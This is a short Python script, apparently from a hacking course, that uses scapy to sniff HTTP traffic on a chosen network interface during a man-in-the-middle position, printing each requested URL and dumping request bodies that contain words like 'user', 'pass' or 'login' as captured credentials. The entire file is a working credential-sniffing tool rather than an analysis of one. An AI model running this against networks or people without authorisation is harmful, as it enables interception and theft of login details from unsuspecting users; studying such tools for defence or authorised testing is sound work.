#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse


def get_argument():
    """
    Input of the required parameters by the user through the terminal window.
    :return: interface name
    """
    parser = optparse.OptionParser()
    parser.add_option('-i', '--interface', dest="interface", help="Mention the interface.")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Interface not provided. Use --help for details.")
    return options.interface


def sniff(interface):
    """
    sniffing the packets, possible only when we are the man in the middle.
    :param interface: interface name
    :return:
    """
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    """
    extracts the url from the packets collected
    :param packet: request packet
    :return: url address
    """
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    """
    extracts login info from the packets collected
    :param packet: request packet
    :return: login information
    """
    keywords = ["user", "pass", "login", "email", "name"]  # keywords that are used to extract login information.
    # Other keywords can be added for more information
    if packet.haslayer(scapy.Raw):
        for i in keywords:
            if i in str(packet[scapy.Raw].load):
                return packet[scapy.Raw].load


def process_sniffed_packet(packet):
    """
    printing the sniffed information from the packets collected.
    :param packet: request packets
    :return:
    """
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>", str(url))
        if get_login_info(packet):
            print("\n[+] Potential username and password information...")
            print(get_login_info(packet))
            print("\n")


def main():
    interface = get_argument()
    sniff(interface)


if __name__ == '__main__':
    main()
